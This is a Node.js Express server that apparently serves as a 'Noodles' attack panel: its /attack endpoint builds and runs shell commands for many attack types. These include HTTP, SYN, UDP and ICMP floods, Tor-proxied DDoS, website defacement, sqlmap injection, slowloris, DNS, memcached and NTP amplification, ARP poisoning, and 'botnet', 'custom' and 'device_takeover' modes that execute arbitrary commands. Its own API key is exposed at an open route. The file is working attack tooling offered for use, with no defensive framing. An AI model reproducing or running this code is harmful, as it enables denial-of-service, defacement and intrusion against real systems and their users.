const express = require('express');
const app = express();
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const publicIp = require('public-ip');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const promClient = require('prom-client');
const { networkInterfaces } = require('os');
const si = require('systeminformation');
const dns = require('dns');
const net = require('net');
const { spawn } = require('child_process');
const cors = require('cors');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

app.use(cors());
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const logFilePath = path.join(__dirname, 'logs.txt');
const apiKey = crypto.randomBytes(32).toString('hex');
const registry = new promClient.Registry();

const attackCounter = new promClient.Counter({
    name: 'noodles_attacks_total',
    help: 'Total number of attacks launched',
    labelNames: ['attackType', 'target'],
    registers: [registry]
});

const attackDurationGauge = new promClient.Gauge({
    name: 'noodles_attack_duration_seconds',
    help: 'Duration of the last attack in seconds',
    labelNames: ['attackType', 'target'],
    registers: [registry]
});

const attackIntensityGauge = new promClient.Gauge({
    name: 'noodles_attack_intensity',
    help: 'Intensity of the last attack',
    labelNames: ['attackType', 'target'],
    registers: [registry]
});

const log = (message) => {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    fs.appendFile(logFilePath, logMessage, (err) => {
        if (err) console.error('Failed to write to log:', err);
    });
    console.log(logMessage.trim());
};

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 1000000,
    message: 'Too many requests, try again after 15 minutes',
    standardHeaders: true,
    legacyHeaders: false,
});

app.use('/attack', apiLimiter);

function getNetworkInterface() {
    const interfaces = networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === 'IPv4') {
                return name;
            }
        }
    }
    return null;
}

async function getSystemStats() {
    try {
        const cpu = await si.cpu();
        const mem = await si.mem();
        const osInfo = await si.osInfo();
        const disk = await si.diskLayout();
        const network = await si.networkInterfaces();

        return {
            cpu: {
                manufacturer: cpu.manufacturer,
                brand: cpu.brand,
                cores: cpu.cores,
                speed: cpu.speed
            },
            memory: {
                total: mem.total,
                free: mem.free,
                used: mem.used
            },
            os: {
                platform: osInfo.platform,
                distro: osInfo.distro,
                release: osInfo.release
            },
            disk: {
                model: disk.length > 0 ? disk[0].model : 'N/A',
                size: disk.length > 0 ? disk[0].size : 'N/A'
            },
            network: network.map(iface => ({
                iface: iface.iface,
                ip4: iface.ip4,
                ip6: iface.ip6,
                mac: iface.mac
            }))
        };
    } catch (e) {
        console.error('Error getting system stats:', e);
        log(`Error getting system stats: ${e.message}`);
        return { error: e.message };
    }
}

app.get('/system-stats', async (req, res) => {
    const userApiKey = req.headers['x-api-key'];

    if (userApiKey !== apiKey) {
        log('Error: Unauthorized API key for system stats.');
        return res.status(401).send('Unauthorized.');
    }

    const stats = await getSystemStats();
    res.json(stats);
});

function resolveTarget(target) {
    return new Promise((resolve, reject) => {
        if (net.isIP(target)) {
            resolve(target);
        } else {
            dns.resolve4(target, (err, addresses) => {
                if (err) {
                    dns.resolve6(target, (err6, addresses6) => {
                        if (err6) {
                            reject(err);
                        } else {
                            resolve(addresses6[0]);
                        }
                    });
                } else {
                    resolve(addresses[0]);
                }
            });
        }
    });
}

function executeCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }
            resolve({ stdout, stderr });
        });
    });
}

function getRandomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

app.post('/attack', async (req, res) => {
    let target = req.body.target;
    const attackType = req.body.attackType;
    const duration = parseInt(req.body.duration) || 60;
    const intensity = parseInt(req.body.intensity) || 100;
    const userApiKey = req.headers['x-api-key'];
    const bypass = req.body.bypass || false;
    const port = parseInt(req.body.port) || 80;

    if (userApiKey !== apiKey) {
        log('Error: Unauthorized API key.');
        return res.status(401).send('Unauthorized.');
    }

    if (!target) {
        log('Error: Target URL is required.');
        return res.status(400).send('Target URL is required.');
    }

    let command = '';
    const numThreads = os.cpus().length * 8;
    let encodedTarget = target;
    const networkInterface = getNetworkInterface();

    attackIntensityGauge.set({ attackType: attackType, target: target }, intensity);

    try {
        if (!net.isIP(target)) {
            target = await resolveTarget(target);
            encodedTarget = target;
        }
    } catch (error) {
        log(`Error resolving target: ${error.message}`);
        return res.status(400).send(`Error resolving target: ${error.message}`);
    }

    switch (attackType) {
        case 'ddos':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A '${getRandomUserAgent()}' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
            break;
        case 'deface':
            const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
            command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}:${port}/index.html"`;
            break;
        case 'connect':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do nc -v ${encodedTarget} ${port} & done; done"`;
            break;
        case 'tor_ddos':
            try {
                const externalIp = await publicIp.v4();
                log(`Attacker IP: ${externalIp}`);
                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A '${getRandomUserAgent()}' -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
            } catch (error) {
                log(`Error getting public IP: ${error.message}`);
                return res.status(500).send(`Error getting public IP: ${error.message}`);
            }
            break;
        case 'sql_inject':
            command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
            break;
        case 'slowloris':
            command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port ${port} -num ${intensity * 50}`;
            break;

        case 'udp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s ${port} -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'syn_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'ping_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f -s 65500 ${encodedTarget} & done; done"`;
            break;

        case 'nuke':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
            break;

        case 'http_flood':
            command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}:${port}; done"`;
            break;

        case 'tcp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'spoofed_flood':
            const spoofedIp = generateRandomIP();
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
            break;

        case 'icmp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'dns_amp':
            const resolverIp = '8.8.8.8';
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do dig @${resolverIp} ${target} ANY +dnssec & done; done"`;
            break;

        case 'memcached_amp':
            const memcachedServer = '127.0.0.1:11211';
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00get stats\\r\\n' | nc -u ${target} 11211 & done; done"`;
            break;

        case 'ntp_amp':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ntpq -n -c monlist ${target} & done; done"`;
            break;

        case 'icmp_smurf':
            const broadcastAddress = target.split('.').slice(0, 3).join('.') + '.255';
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source -a ${target} ${broadcastAddress} & done; done"`;
            break;

        case 'arp_cache_poisoning':
            if (!networkInterface) {
                log('Error: No suitable network interface found for ARP poisoning.');
                return res.status(500).send('No suitable network interface found.');
            }
            const gatewayIp = '192.168.1.1';
            const victimIp = target;
            const attackerMac = '00:11:22:33:44:55';
            command = `timeout ${duration} bash -c "while true; do arpspoof -i ${networkInterface} -t ${victimIp} ${gatewayIp} & arpspoof -i ${networkInterface} -t ${gatewayIp} ${victimIp} & done"`;
            break;

        case 'slow_read':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget}:${port} & done; done"`;
            break;

        case 'pod_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p ${port} ${encodedTarget} & done; done"`;
            break;

        case 'payload':
            const payload = req.body.payload;
            if (!payload) {
                log('Error: Payload is required for payload attack.');
                return res.status(400).send('Payload is required for payload attack.');
            }
            command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
            break;

        case 'rudy':
            command = `timeout ${duration} python3 rudy.py -t ${encodedTarget} -n ${numThreads} -s ${intensity}`;
            break;

        case 'goldeneye':
            command = `timeout ${duration} python3 goldeneye.py ${encodedTarget} ${numThreads}`;
            break;

        case 'xerxes':
            command = `timeout ${duration} ./xerxes ${encodedTarget} ${numThreads}`;
            break;

        case 'botnet':
            const botCommand = req.body.botCommand;
            if (!botCommand) {
                log('Error: Bot command is required for botnet attack.');
                return res.status(400).send('Bot command is required for botnet attack.');
            }
            command = `timeout ${duration} bash -c "${botCommand}"`;
            break;

        case 'raw_tcp':
            const rawPayload = req.body.rawPayload;
            if (!rawPayload) {
                log('Error: Raw TCP payload is required for raw_tcp attack.');
                return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
            }
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
            break;

        case 'custom':
            const customCommand = req.body.customCommand;
            if (!customCommand) {
                log('Error: Custom command is required for custom attack.');
                return res.status(400).send('Custom command is required for custom attack.');
            }
            command = customCommand;
            break;
        case 'layer7':
            const layer7Method = req.body.layer7Method;
            const layer7Options = req.body.layer7Options || '';
            if (!layer7Method) {
                log('Error: Layer7 method is required for layer7 attack.');
                return res.status(400).send('Layer7 method is required for layer7 attack.');
            }
            command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
            break;

        case 'http_header_injection':
            const headerName = req.body.headerName;
            const headerValue = req.body.headerValue;
            if (!headerName || !headerValue) {
                log('Error: Header name and value are required for HTTP header injection attack.');
                return res.status(400).send('Header name and value are required for HTTP header injection attack.');
            }
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
            break;

        case 'cc_bypass':
            const ccBypassMethod = req.body.ccBypassMethod;
            const ccBypassData = req.body.ccBypassData;

            if (!ccBypassMethod || !ccBypassData) {
                log('Error: CC Bypass method and data are required');
                return res.status(400).send('CC Bypass method and data are required');
            }
            command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
            break;
        case 'device_takeover':
            const deviceCommand = req.body.deviceCommand;

            if (!deviceCommand) {
                log('Error: Device command is required for device takeover');
                return res.status(400).send('Device command is required for device takeover');
            }
            command = `timeout ${duration} bash -c "${deviceCommand}"`;
            break;

        default:
            log(`Error: Invalid attack type: ${attackType}`);
            return res.status(400).send('Invalid attack type.');
    }

    log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);

    attackCounter.inc({ attackType: attackType, target: target });
    const attackStartTime = Date.now();

    try {
        const { stdout, stderr } = await executeCommand(command);
        const attackEndTime = Date.now();
        const actualDuration = (attackEndTime - attackStartTime) / 1000;
        attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);

        if (stderr) {
            log(`Attack stderr: ${stderr}`);
        }
        log(`Attack completed. stdout: ${stdout}`);
        res.send('Attack initiated. Check logs for details.');
    } catch (error) {
        log(`Attack failed: ${error.message}`);
        console.error(`exec error: ${error}`);
        res.status(500).send(`Attack failed: ${error.message}`);
    }
});

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

app.get('/logs', (req, res) => {
    fs.readFile(logFilePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Failed to read logs:', err);
            return res.status(500).send('Failed to read logs.');
        }
        res.send(data.split('\n').reverse().join('\n'));
    });
});

app.get('/api-key', (req, res) => {
    res.send({ apiKey: apiKey });
});

app.get('/metrics', async (req, res) => {
    res.setHeader('Content-Type', registry.contentType);
    const metrics = await registry.metrics();
    res.send(metrics);
});

app.get('/download/:file', (req, res) => {
    const file = req.params.file;
    const filePath = path.join(__dirname, file);

    fs.access(filePath, fs.constants.F_OK, (err) => {
        if (err) {
            return res.status(404).send('File not found');
        }

        res.download(filePath);
    });
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    log(`Fatal error: ${err.message}`);
    res.status(500).send('Something broke!');
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    log(`Uncaught Exception: ${err.message}`);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    log(`Unhandled Rejection: ${reason}`);
});

const PORT = process.env.PORT || 3000;

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
        cluster.fork();
    });
} else {
    app.listen(PORT, () => {
        console.log(`Worker ${process.pid} listening on port ${PORT}`);
        log(`Worker ${process.pid} started on port ${PORT}`);
    });
}